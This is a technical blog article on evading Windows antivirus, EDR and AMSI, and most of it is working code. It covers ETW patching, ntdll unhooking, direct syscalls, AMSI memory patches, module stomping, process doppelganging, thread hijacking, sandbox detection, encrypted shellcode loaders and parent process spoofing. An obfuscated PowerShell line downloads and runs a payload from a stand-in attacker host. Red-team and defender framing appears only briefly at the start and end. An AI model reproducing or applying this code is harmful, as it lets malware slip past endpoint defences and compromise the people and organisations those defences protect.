---
title: "Windows Anti-Virus Evasion: Bypassing EDR, AMSI, and Behavioral Detection"
description: "Advanced techniques for evading modern endpoint security solutions including EDR bypass methods, AMSI circumvention, process injection without detection, and behavioral analysis evasion strategies."
pubDate: 2024-04-10
author: "Mamoun Tarsha-Kurdi"
tags: ["reverse-engineering", "windows", "evasion", "malware"]
draft: false
---

## Introduction

Modern endpoint security extends far beyond signature-based detection. EDR (Endpoint Detection and Response), behavioral analysis, AMSI (Anti-Malware Scan Interface), and machine learning models create multi-layered defenses. This guide explores techniques used by red teams and malware authors to evade these protections.

## Anti-Virus Detection Mechanisms

### Signature-Based Detection

```python
# Simple signature example
MALICIOUS_SIGNATURE = b'\x48\x31\xC0\x48\x89\xC7\x48\x89\xC6'
# Pattern: xor rax, rax; mov rdi, rax; mov rsi, rax

def scan_file(file_path):
    with open(file_path, 'rb') as f:
        content = f.read()

    if MALICIOUS_SIGNATURE in content:
        return "THREAT DETECTED"

    return "CLEAN"
```

**Evasion**: Simple polymorphism

```asm
; Original shellcode
xor rax, rax
mov rdi, rax
mov rsi, rax

; Polymorphic equivalent (different bytes, same behavior)
sub rax, rax    ; Different opcode for zeroing
push rax
pop rdi         ; Alternative mov
mov rsi, rdi
```

### Heuristic Analysis

Analyzes code behavior without specific signatures.

```c
// Detected heuristic: Allocates RWX memory + writes code + executes
PVOID mem = VirtualAlloc(NULL, 0x1000,
                         MEM_COMMIT | MEM_RESERVE,
                         PAGE_EXECUTE_READWRITE);  // Suspicious!
memcpy(mem, shellcode, shellcode_len);
((void(*)())mem)();  // Execute from heap - DETECTED
```

**Evasion**: Separate allocation and protection change

```c
// Less suspicious: RW allocation → write → change to RX → execute
PVOID mem = VirtualAlloc(NULL, 0x1000,
                         MEM_COMMIT | MEM_RESERVE,
                         PAGE_READWRITE);  // Not RWX

memcpy(mem, shellcode, shellcode_len);

DWORD old_protect;
VirtualProtect(mem, shellcode_len, PAGE_EXECUTE_READ, &old_protect);

((void(*)())mem)();
```

### Behavioral Detection

Monitors runtime behavior for malicious patterns.

**Common triggers**:
- Rapid file encryption (ransomware)
- Credential access (LSASS dump)
- Process injection
- Registry persistence modifications

## EDR (Endpoint Detection and Response) Bypass

### ETW (Event Tracing for Windows) Patching

EDR agents hook ETW to monitor syscalls, process creation, network activity.

```c
// Disable ETW in current process
#include <windows.h>

BOOL DisableETW() {
    // Locate EtwEventWrite in ntdll.dll
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PVOID etw_event_write = GetProcAddress(ntdll, "EtwEventWrite");

    if (!etw_event_write) return FALSE;

    // Patch with 'ret' instruction (0xC3)
    DWORD old_protect;
    VirtualProtect(etw_event_write, 1, PAGE_EXECUTE_READWRITE, &old_protect);

    *(BYTE*)etw_event_write = 0xC3;  // ret

    VirtualProtect(etw_event_write, 1, old_protect, &old_protect);

    return TRUE;
}
```

**Detection bypass**: ETW events from this process are suppressed.

### Unhooking User-Mode Hooks

EDR injects DLLs that hook API calls. Unhook by restoring original bytes.

```c
#include <windows.h>
#include <winternl.h>

BOOL UnhookNtdll() {
    // Load clean ntdll.dll from disk
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll",
                               GENERIC_READ, FILE_SHARE_READ,
                               NULL, OPEN_EXISTING, 0, NULL);

    HANDLE hMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY, 0, 0, NULL);
    PVOID pCleanNtdll = MapViewOfFile(hMapping, FILE_MAP_READ, 0, 0, 0);

    // Get hooked ntdll in memory
    PVOID pHookedNtdll = GetModuleHandleA("ntdll.dll");

    // Parse PE headers
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)pHookedNtdll;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)pHookedNtdll + dos->e_lfanew);

    // Find .text section
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)section->Name, ".text") == 0) {
            // Restore original .text section
            DWORD old_protect;
            VirtualProtect((BYTE*)pHookedNtdll + section->VirtualAddress,
                          section->Misc.VirtualSize,
                          PAGE_EXECUTE_READWRITE,
                          &old_protect);

            memcpy((BYTE*)pHookedNtdll + section->VirtualAddress,
                  (BYTE*)pCleanNtdll + section->VirtualAddress,
                  section->Misc.VirtualSize);

            VirtualProtect((BYTE*)pHookedNtdll + section->VirtualAddress,
                          section->Misc.VirtualSize,
                          old_protect,
                          &old_protect);

            break;
        }
        section++;
    }

    UnmapViewOfFile(pCleanNtdll);
    CloseHandle(hMapping);
    CloseHandle(hFile);

    return TRUE;
}
```

### Direct Syscalls

Bypass user-mode hooks entirely by invoking syscalls directly.

```asm
; Direct syscall stub for NtAllocateVirtualMemory
section .text
global NtAllocateVirtualMemory

NtAllocateVirtualMemory:
    mov r10, rcx                    ; Save RCX
    mov eax, 0x18                   ; Syscall number (NtAllocateVirtualMemory)
    syscall                         ; Direct kernel transition
    ret
```

**C wrapper**:

```c
extern NTSTATUS NtAllocateVirtualMemory(
    HANDLE ProcessHandle,
    PVOID* BaseAddress,
    ULONG_PTR ZeroBits,
    PSIZE_T RegionSize,
    ULONG AllocationType,
    ULONG Protect
);

int main() {
    PVOID base = NULL;
    SIZE_T size = 0x1000;

    // Call directly - bypasses user-mode hooks
    NTSTATUS status = NtAllocateVirtualMemory(
        GetCurrentProcess(),
        &base,
        0,
        &size,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    printf("Allocated: %p\n", base);
}
```

**Syscall number retrieval**:

```c
// Extract syscall number from ntdll.dll
DWORD GetSyscallNumber(const char* func_name) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    PVOID func = GetProcAddress(ntdll, func_name);

    // Parse syscall stub
    // Windows 10: mov r10, rcx; mov eax, <number>; syscall; ret
    BYTE* stub = (BYTE*)func;

    if (stub[0] == 0x4C && stub[1] == 0x8B && stub[2] == 0xD1 &&  // mov r10, rcx
        stub[3] == 0xB8) {  // mov eax, imm32
        return *(DWORD*)(stub + 4);
    }

    return 0;
}

DWORD syscall_num = GetSyscallNumber("NtAllocateVirtualMemory");
printf("Syscall number: 0x%X\n", syscall_num);
```

## AMSI (Anti-Malware Scan Interface) Bypass

AMSI scans PowerShell, VBScript, JScript, and .NET Assembly loads.

### Memory Patching

```powershell
# PowerShell AMSI bypass (requires admin or SeDebugPrivilege)
$a = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$b = $a.GetField('amsiInitFailed', 'NonPublic,Static')
$b.SetValue($null, $true)

# Now AMSI is disabled for this PowerShell session
```

**C# equivalent**:

```csharp
using System;
using System.Runtime.InteropServices;

public class AmsiBypass {
    [DllImport("kernel32")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
                                      uint flNewProtect, out uint lpflOldProtect);

    public static void Bypass() {
        IntPtr amsi = LoadLibrary("amsi.dll");
        IntPtr amsiScanBuffer = GetProcAddress(amsi, "AmsiScanBuffer");

        uint old_protect;
        VirtualProtect(amsiScanBuffer, (UIntPtr)5, 0x40, out old_protect);

        // Patch AmsiScanBuffer with: mov eax, 0x80070057; ret
        byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
        Marshal.Copy(patch, 0, amsiScanBuffer, 6);

        VirtualProtect(amsiScanBuffer, (UIntPtr)5, old_protect, out old_protect);
    }
}
```

### Obfuscation

```powershell
# Simple string obfuscation
$encoded = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes("IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"))

# Decode and execute
IEX ([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String($encoded)))

# Variable name randomization
${`a`B`c} = "IEX"
${`x`Y`z} = "(New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"
& ${`a`B`c} ${`x`Y`z}
```

### Reflection-Based Loading

```csharp
// Load .NET assembly without triggering AMSI
byte[] assembly_bytes = File.ReadAllBytes("payload.exe");

// XOR decrypt (bypasses static signature)
for (int i = 0; i < assembly_bytes.Length; i++) {
    assembly_bytes[i] ^= 0xAA;
}

// Load into memory (AMSI may scan here)
Assembly assembly = Assembly.Load(assembly_bytes);

// Invoke entry point
assembly.EntryPoint.Invoke(null, new object[] { new string[] { } });
```

## Process Injection Without Detection

### Module Stomping

Overwrite legitimate DLL with malicious code.

```c
#include <windows.h>

BOOL ModuleStomp(const char* target_dll, PVOID payload, SIZE_T payload_size) {
    // Load target DLL
    HMODULE target = LoadLibraryA(target_dll);
    if (!target) return FALSE;

    // Find code cave (large enough region)
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)target;
    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)target + dos->e_lfanew);
    PIMAGE_SECTION_HEADER section = IMAGE_FIRST_SECTION(nt);

    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++) {
        if (section->Characteristics & IMAGE_SCN_MEM_EXECUTE &&
            section->Misc.VirtualSize >= payload_size) {

            PVOID cave = (BYTE*)target + section->VirtualAddress;

            // Change protection
            DWORD old_protect;
            VirtualProtect(cave, payload_size, PAGE_EXECUTE_READWRITE, &old_protect);

            // Write payload
            memcpy(cave, payload, payload_size);

            VirtualProtect(cave, payload_size, old_protect, &old_protect);

            // Create thread in stomped region
            CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)cave, NULL, 0, NULL);

            return TRUE;
        }
        section++;
    }

    return FALSE;
}
```

### Process Doppelgänging

Abuse NTFS transactions to create process from transacted file.

```c
#include <windows.h>
#include <ktmw32.h>

BOOL ProcessDoppelganging(const char* legitimate_exe, PVOID payload, SIZE_T size) {
    // Create transaction
    HANDLE hTransaction = CreateTransaction(NULL, 0, 0, 0, 0, 0, NULL);

    // Create transacted file
    HANDLE hFile = CreateFileTransactedA(
        "C:\\Windows\\Temp\\legit.exe",
        GENERIC_WRITE | GENERIC_READ,
        0, NULL, CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction, NULL, NULL
    );

    // Write payload to transacted file
    DWORD written;
    WriteFile(hFile, payload, size, &written, NULL);

    // Create section from transacted file
    HANDLE hSection;
    NtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL,
                    NULL, PAGE_READONLY, SEC_IMAGE, hFile);

    CloseHandle(hFile);

    // Rollback transaction (file never actually written to disk!)
    RollbackTransaction(hTransaction);
    CloseHandle(hTransaction);

    // Create process from section
    HANDLE hProcess, hThread;
    NtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL,
                      GetCurrentProcess(), 0, hSection, NULL, NULL, FALSE);

    // ... create thread in process ...

    return TRUE;
}
```

### Thread Hijacking

Inject into existing thread (avoids CreateRemoteThread detection).

```c
BOOL ThreadHijack(DWORD target_pid, PVOID payload, SIZE_T size) {
    // Open target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);

    // Allocate memory in target
    PVOID remote_mem = VirtualAllocEx(hProcess, NULL, size,
                                      MEM_COMMIT | MEM_RESERVE,
                                      PAGE_EXECUTE_READWRITE);

    // Write payload
    WriteProcessMemory(hProcess, remote_mem, payload, size, NULL);

    // Open first thread
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    THREADENTRY32 te = { sizeof(THREADENTRY32) };

    DWORD target_tid = 0;
    Thread32First(hSnapshot, &te);
    do {
        if (te.th32OwnerProcessID == target_pid) {
            target_tid = te.th32ThreadID;
            break;
        }
    } while (Thread32Next(hSnapshot, &te));

    CloseHandle(hSnapshot);

    // Suspend thread
    HANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, target_tid);
    SuspendThread(hThread);

    // Get thread context
    CONTEXT ctx = { CONTEXT_FULL };
    GetThreadContext(hThread, &ctx);

    // Save original RIP on stack
    ctx.Rsp -= 8;
    DWORD64 original_rip = ctx.Rip;
    WriteProcessMemory(hProcess, (PVOID)ctx.Rsp, &original_rip, 8, NULL);

    // Redirect RIP to payload
    ctx.Rip = (DWORD64)remote_mem;
    SetThreadContext(hThread, &ctx);

    // Resume thread → executes payload
    ResumeThread(hThread);
    CloseHandle(hThread);

    return TRUE;
}
```

## Sandbox Evasion

### Sleep Acceleration Detection

Sandboxes accelerate sleep to speed up analysis.

```c
#include <windows.h>

BOOL DetectSandbox() {
    DWORD start = GetTickCount();
    Sleep(10000);  // Sleep 10 seconds
    DWORD end = GetTickCount();

    // If sleep was accelerated, we're in a sandbox
    if ((end - start) < 9000) {
        return TRUE;  // Sandbox detected
    }

    return FALSE;
}
```

### User Interaction Check

Sandboxes lack user interaction.

```c
BOOL CheckUserActivity() {
    LASTINPUTINFO lii = { sizeof(LASTINPUTINFO) };
    GetLastInputInfo(&lii);

    DWORD idle_time = GetTickCount() - lii.dwTime;

    // If no input for 10 minutes, likely sandbox
    if (idle_time > 600000) {
        return FALSE;  // No user activity
    }

    return TRUE;
}
```

### Resource Checks

VMs have limited resources.

```c
BOOL CheckResources() {
    MEMORYSTATUSEX mem = { sizeof(MEMORYSTATUSEX) };
    GlobalMemoryStatusEx(&mem);

    // Check physical RAM (sandboxes often have < 4GB)
    if (mem.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) {
        return TRUE;  // Likely VM
    }

    // Check CPU cores
    SYSTEM_INFO si;
    GetSystemInfo(&si);
    if (si.dwNumberOfProcessors < 2) {
        return TRUE;  // Likely VM
    }

    return FALSE;
}
```

## Encryption and Packing

### XOR Encryption

```c
void xor_encrypt(BYTE* data, SIZE_T len, BYTE key) {
    for (SIZE_T i = 0; i < len; i++) {
        data[i] ^= key;
    }
}

int main() {
    BYTE shellcode[] = { /* encrypted shellcode */ };
    SIZE_T size = sizeof(shellcode);

    // Decrypt at runtime
    xor_encrypt(shellcode, size, 0xAA);

    // Execute
    PVOID mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    memcpy(mem, shellcode, size);
    ((void(*)())mem)();
}
```

### AES Encryption

```c
#include <wincrypt.h>

BOOL AESDecrypt(BYTE* encrypted, SIZE_T enc_len, BYTE* key, BYTE* output) {
    HCRYPTPROV hProv;
    HCRYPTKEY hKey;
    HCRYPTHASH hHash;

    CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);

    // Derive key from password
    CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
    CryptHashData(hHash, key, 32, 0);
    CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);

    // Decrypt
    memcpy(output, encrypted, enc_len);
    DWORD len = enc_len;
    CryptDecrypt(hKey, 0, TRUE, 0, output, &len);

    CryptDestroyKey(hKey);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);

    return TRUE;
}
```

## Behavioral Evasion

### Delayed Execution

```c
// Wait before executing malicious behavior
void DelayedExecution() {
    // Sleep for 30 minutes (bypass sandbox timeout)
    Sleep(1800000);

    // Perform malicious activity
    DownloadPayload();
    ExecutePayload();
}
```

### Parent Process Spoofing

```c
#include <windows.h>

BOOL CreateProcessWithSpoofedParent(DWORD parent_pid, const char* cmd) {
    // Open parent process
    HANDLE hParent = OpenProcess(PROCESS_ALL_ACCESS, FALSE, parent_pid);

    // Initialize STARTUPINFOEX
    SIZE_T size;
    InitializeProcThreadAttributeList(NULL, 1, 0, &size);
    LPPROC_THREAD_ATTRIBUTE_LIST attrs = (LPPROC_THREAD_ATTRIBUTE_LIST)malloc(size);
    InitializeProcThreadAttributeList(attrs, 1, 0, &size);

    // Set parent process attribute
    UpdateProcThreadAttribute(attrs, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                              &hParent, sizeof(HANDLE), NULL, NULL);

    // Create process with spoofed parent
    STARTUPINFOEXA si = { sizeof(STARTUPINFOEXA) };
    si.lpAttributeList = attrs;

    PROCESS_INFORMATION pi;
    CreateProcessA(NULL, (LPSTR)cmd, NULL, NULL, FALSE,
                   CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT,
                   NULL, NULL, &si.StartupInfo, &pi);

    ResumeThread(pi.hThread);

    CloseHandle(hParent);
    DeleteProcThreadAttributeList(attrs);
    free(attrs);

    return TRUE;
}
```

## Conclusion

Modern AV/EDR evasion requires layered techniques combining syscall invocation, memory manipulation, behavioral adaptation, and encryption. No single technique guarantees evasion—successful bypasses combine multiple methods to evade signature, heuristic, and behavioral detection.

Security researchers must understand these techniques to build robust defenses, while red teams leverage them for realistic threat simulation.

## References

1. Microsoft (2023). "AMSI Documentation"
2. Cobalt Strike (2023). "Beacon Object Files"
3. Red Canary (2023). "Threat Detection Report"
4. MITRE ATT&CK (2023). "Defense Evasion Techniques"
